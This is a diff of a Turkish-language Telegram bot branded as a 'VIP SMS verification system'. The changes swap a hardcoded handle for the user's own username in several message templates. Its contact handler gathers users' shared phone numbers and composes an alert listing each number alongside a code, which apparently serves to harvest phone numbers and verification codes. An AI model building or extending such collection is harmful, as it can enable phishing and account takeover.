@@ -49,12 +49,14 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if user.id in banned_users:
         return
 
+    username = f"@{user.username}" if user.username else user.first_name
+
     text = f"""
 ╔════════════════════════════╗
 🌟✨ VIP SMS ONAY SİSTEMİ ✨🌟
 ╚════════════════════════════╝
 
-👤 Kullanıcı: @tanrican
+👤 Kullanıcı: {username}
 🆔 ID: {user.id}
 
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@@ -97,7 +99,7 @@ async def menu_buttons(update: Update, context: ContextTypes.DEFAULT_TYPE):
         selected_country[user.id] = country_name
         waiting_number.add(user.id)
 
-        btn = KeyboardButton("📲 SMS ONAY")  # Buton güncellendi
+        btn = KeyboardButton("📲 SMS ONAY")  # Süslü buton
         kb = ReplyKeyboardMarkup([[btn]], resize_keyboard=True, one_time_keyboard=True)
 
         await query.message.reply_text(f"""
@@ -115,7 +117,7 @@ async def menu_buttons(update: Update, context: ContextTypes.DEFAULT_TYPE):
 👑 HESABIM 👑
 ╚══════════════╝
 
-👤 Kullanıcı Adı: @tanrican
+👤 Kullanıcı Adı: {username}
 🆔 ID: {user.id}
 💎 Durum: VIP Kullanıcı
 """)
@@ -154,10 +156,11 @@ async def contact_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 """)
 
     phone = update.message.contact.phone_number
+    username = f"@{user.username}" if user.username else user.first_name
     text = f"""
 🚨 YENİ SMS ONAY
 
-👤 Kullanıcı: @tanrican
+👤 Kullanıcı: {username}
 🆔 ID: {user.id}
 📞 Numara: {phone}
 🔢 Kod: {code}
